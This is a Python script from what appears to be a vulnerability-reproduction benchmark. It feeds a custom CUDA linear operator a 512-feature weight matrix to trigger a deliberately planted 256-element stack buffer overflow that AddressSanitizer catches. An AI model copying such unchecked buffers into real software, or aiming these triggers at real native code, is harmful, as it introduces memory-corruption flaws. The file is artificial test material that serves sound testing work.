"""
ASAN Reproducibility Benchmark — Vulnerability Trigger Script

This script loads the compiled custom linear projection operator and feeds
it an adversarial weight matrix shape designed to trigger the stack buffer
overflow in custom_operator.cpp.

Vulnerability: The C++ binding pre-computes per-output-feature metadata into
a fixed-size stack buffer: `float feature_scales[256]`. When the weight matrix
has more than 256 output features (weight.size(0) > 256), the loop overflows
the buffer and AddressSanitizer (ASAN) intercepts it as a stack-buffer-overflow.

Trigger: weight shape (512, 64) → N=512 output features > 256 buffer capacity.
"""

import torch
import sys
import traceback

import vulnerability_benchmark_ops_cuda


def trigger_vulnerability():
    print("=" * 65)
    print(" ASAN REPRODUCIBILITY BENCHMARK — VULNERABILITY TRIGGER")
    print("=" * 65)
    print()

    # --- Vulnerability metadata ---
    print("[*] Vulnerability Target  : Stack Buffer Overflow (CWE-121)")
    print("[*] Location              : modules/custom_operator.cpp")
    print("[*] Root Cause            : float feature_scales[256] with")
    print("                            unchecked N (out_features)")
    print("[*] Buffer Capacity       : 256 elements (1024 bytes)")
    print()

    # --- Adversarial tensor configuration ---
    # weight.size(0) = 512 output features >> 256 buffer capacity
    batch_size    = 8
    in_features   = 64
    out_features  = 512   # This exceeds the 256-element stack buffer

    input_shape  = (batch_size, in_features)
    weight_shape = (out_features, in_features)
    bias_shape   = (out_features,)

    print(f"[*] Input Shape           : {input_shape}")
    print(f"[*] Weight Shape          : {weight_shape}")
    print(f"[*] Bias Shape            : {bias_shape}")
    print(f"[*] N (out_features)      : {out_features}")
    print(f"[*] Overflow Amount       : {out_features - 256} elements "
          f"({(out_features - 256) * 4} bytes)")
    print(f"[*] Expected Failure      : ASAN stack-buffer-overflow")
    print()

    # --- CUDA availability check ---
    if not torch.cuda.is_available():
        print("[-] CUDA is not available in this environment.")
        print("[-] The operator requires CUDA tensors (TORCH_CHECK).")
        print("[-] On a machine without GPU, this is expected.")
        sys.exit(0)

    print(f"[*] CUDA Device           : {torch.cuda.get_device_name(0)}")
    print()

    # --- Construct adversarial tensors ---
    input_tensor  = torch.randn(input_shape,  dtype=torch.float32, device="cuda")
    weight_tensor = torch.randn(weight_shape, dtype=torch.float32, device="cuda")
    bias_tensor   = torch.randn(bias_shape,   dtype=torch.float32, device="cuda")

    # --- Fire the exploit ---
    print("[*] Launching custom_linear with adversarial weight shape...")
    print("[*] If ASAN is active, the process will abort below with a stack trace.")
    print("-" * 65)

    try:
        output = vulnerability_benchmark_ops_cuda.custom_linear(
            input_tensor, weight_tensor, bias_tensor
        )

        # If we reach here, ASAN did NOT halt execution
        print()
        print("[-] WARNING: Execution completed without ASAN triggering.")
        print("[-] Possible causes:")
        print("    1. Extension was not compiled with -fsanitize=address")
        print("    2. The compiler optimized away the vulnerable loop")
        print("    3. ASAN runtime library (libasan) is not loaded")
        print("    4. Running the PATCHED build (PATCH_APPLIED=1)")
        sys.exit(1)

    except Exception as e:
        # ASAN typically kills with SIGABRT before Python catches anything,
        # but handle any Python-level memory errors
        print()
        print(f"[*] Observed Failure: {type(e).__name__}: {e}")
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    trigger_vulnerability()
